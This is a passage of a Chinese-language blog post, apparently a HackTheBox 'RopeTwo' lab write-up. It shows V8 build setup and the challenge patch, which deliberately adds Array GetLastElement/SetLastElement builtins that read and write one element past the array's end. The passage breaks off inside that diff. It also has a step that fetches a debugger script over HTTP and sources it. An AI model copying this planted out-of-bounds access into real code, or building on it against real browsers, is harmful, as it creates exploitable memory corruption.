@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="摘要V8是由Google开发的著名浏览器Chrome的JavaScript引擎。 此篇文章专门记录hack the box - ropetwo机器中的chrome浏览器v8引擎的pwn部分。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="摘要V8是由Google开发的著名浏览器Chrome的JavaScript引擎。 此篇文章专门记录hack the box - ropetwo机器中的chrome浏览器v8引擎的pwn部分。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb165.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb166.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb167.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb168.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb169.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb170.jpg">
+<meta property="article:published_time" content="2021-01-22T17:27:52.000Z">
+<meta property="article:modified_time" content="2021-01-23T16:56:56.160Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/","path":"2021/01/23/chrome-browserv8-pwn/","title":"HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%A6%81"><span class="nav-number">1.</span> <span class="nav-text">摘要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="nav-number">2.</span> <span class="nav-text">step1-环境搭建及工具安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step2"><span class="nav-number">3.</span> <span class="nav-text">step2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step3-%E7%BC%96%E8%AF%91%E6%9C%89%E6%BC%8F%E6%B4%9E%E7%9A%84v8%E6%BA%90%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">step3-编译有漏洞的v8源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step4-%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">step4-开始分析调试</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-23 01:27:52" itemprop="dateCreated datePublished" datetime="2021-01-23T01:27:52+08:00">2021-01-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-01-24 00:56:56" itemprop="dateModified" datetime="2021-01-24T00:56:56+08:00">2021-01-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>V8是由Google开发的著名浏览器Chrome的JavaScript引擎。</p>
+<p>此篇文章专门记录hack the box - ropetwo机器中的chrome浏览器v8引擎的pwn部分。</p>
+<span id="more"></span>
+
+<h2 id="step1-环境搭建及工具安装"><a href="#step1-环境搭建及工具安装" class="headerlink" title="step1-环境搭建及工具安装"></a>step1-环境搭建及工具安装</h2><p>在开始实验之前，先把所有环境准备好，本人实验环境是在ubuntu 16.04.1 amd64位的vm虚拟机下进行的。</p>
+<ol>
+<li>安装google的depot_tools</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/home/pwn/tools/depot_tools:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>安装gdb和gdb功能增强插件gef</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1Z3N5L2dlZg==">GEF github<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手动安装并导入gdb初始化文件</span></span><br><span class="line">$ wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py</span><br><span class="line">$ <span class="built_in">echo</span> <span class="built_in">source</span> ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>fetch google v8引擎</li>
+</ol>
+<p><font color="red">fetch之前，请想办法解决让整个ubuntu系统的流量全部走代理，不然会fetch失败</font></p>
+<ul>
+<li>fetch之前先运行以下的命令，初始化gclient工具集，使gclient工具集保持完整，没有这一步，之后的fetch v8一定会失败报错。。。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gclient</span><br></pre></td></tr></table></figure>
+
+<p>接着下载V8的代码以及生成项目文件。fetch v8刚开始的时候会有很长一段时间卡住不动，只是没有输出而已，只要没有报错，就是在正常运行，耐心等待就好了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载v8的repo和必要依赖</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure>
+
+<p>至此所有环境已搭建完毕，之后会介绍编译v8源码成d8的debug和release的版本便于调试, x64.release和x64.debug这两个文件夹中都有一个数据库二进制文件。debug版本将在REPL中提供更多信息，但它不允许在不崩溃(支持fuzzing)的情况下进行越限的读&#x2F;写，所以在开始时使用release版本。</p>
+<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><p>连接openvpn到rope2的ip地址，然后下载如下commit的diff文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.196:5000/root/v8/commit/7410f6809dd33e317f11f39ceaebaba9a88ea970</span><br></pre></td></tr></table></figure>
+
+<p>点击Options的Plain Diff即可下载.diff文件</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg"></li>
+</ul>
+<p>然后到如下链接，点击Download下载具有漏洞的chrome浏览器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.196:8000/</span><br></pre></td></tr></table></figure>
+
+<p>然后拷贝r4j之前的一个commit备用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gitlab.rope2.htb:5000/root/v8/commits/master</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d91e8d8fca64679c8df05603b5ff7e58709c4801</span><br></pre></td></tr></table></figure>
+
+<h2 id="step3-编译有漏洞的v8源码"><a href="#step3-编译有漏洞的v8源码" class="headerlink" title="step3-编译有漏洞的v8源码"></a>step3-编译有漏洞的v8源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801</span><br><span class="line">$ gclient <span class="built_in">sync</span></span><br><span class="line">$ git apply ../patch.diff </span><br><span class="line">$ ./tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C ./out.gn/x64.release</span><br><span class="line">$ ./tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></figure>
+
+<h2 id="step4-开始分析调试"><a href="#step4-开始分析调试" class="headerlink" title="step4-开始分析调试"></a>step4-开始分析调试</h2><p>唯一的障碍会偶然发现在这个挑战是指针压缩,这使得在32位地址表示,导致泄漏很难取得成功, 因为隔离root, 上一个地址的32位值用于访问数据在V8堆成了一个问题。但是提到了不需要知道隔离root地址，如果能够设法处理漏洞，得到fakeobj和addrof原语，那么就可以通过指针压缩，这将不会是一个问题。</p>
+<p>首先，需要分析补丁文件，这样就能发现哪些提交了特别的推送更改，并将其准确地推送到:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/rope2<span class="comment"># cat patch.diff </span></span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) &#123;</span><br><span class="line">   <span class="built_in">return</span> GenericArrayFill(isolate, receiver, value, start_index, end_index);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+BUILTIN(ArrayGetLastElement)</span><br><span class="line">+&#123;</span><br><span class="line">+	Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+	<span class="built_in">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(len)));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+BUILTIN(ArraySetLastElement)</span><br><span class="line">+&#123;</span><br><span class="line">+	Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+	int arg_count = args.length();</span><br><span class="line">+	<span class="keyword">if</span> (arg_count != 2) // first value is always this</span><br><span class="line">+	&#123;</span><br><span class="line">+		<span class="built_in">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+	&#125;</span><br><span class="line">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+	Handle&lt;Object&gt; value;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));</span><br><span class="line">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+	elements.set(len,value-&gt;Number());</span><br><span class="line">+	<span class="built_in">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> namespace &#123;</span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">                                               BuiltinArguments* args) &#123;</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 92a430aa2c0cbc3d65fdf2f1f4f295824379dbd8..02982b1c858eb313befcb8ad9e396dcdfbf2f9ab 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -319,6 +319,8 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">   /* ES6 <span class="comment">#sec-array.prototype.push */                                          \</span></span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line">+  CPP(ArrayGetLastElement)                                                     \</span><br><span class="line">+  CPP(ArraySetLastElement)                                                     \</span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 <span class="comment">#sec-array.prototype.shift */                                         \</span></span><br><span class="line">   CPP(ArrayShift)                                                              \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 6d53531f1cbf9b6669c6b98ea8779e8133babe8d..5db31e9b733cdaa1dd2049b72b7fb6392ea4a1ab 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1706,6 +1706,11 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     // Array <span class="built_in">functions</span>.</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayIsArray:</span><br><span class="line">       <span class="built_in">return</span> Type::Boolean();</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayGetLastElement:</span><br><span class="line">+      <span class="built_in">return</span> Type::Receiver();</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArraySetLastElement:</span><br><span class="line">+      <span class="built_in">return</span> Type::Receiver();</span><br><span class="line">+</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayConcat:</span><br><span class="line">       <span class="built_in">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayEvery:</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92aa689968 100644</span><br><span class="line">--- a/src/init/bootstrapper.cc</span><br><span class="line">+++ b/src/init/bootstrapper.cc</span><br><span class="line">@@ -1660,6 +1660,10 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeLastIndexOf, 1, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;pop&quot;</span>, Builtins::kArrayPrototypePop,</span><br><span class="line">                           0, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;GetLastElement&quot;</span>, Builtins::kArrayGetLastElement,</span><br><span class="line">+                          0, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;SetLastElement&quot;</span>, Builtins::kArraySetLastElement,</span><br><span class="line">+                          0, <span class="literal">false</span>);</span><br><span class="line">     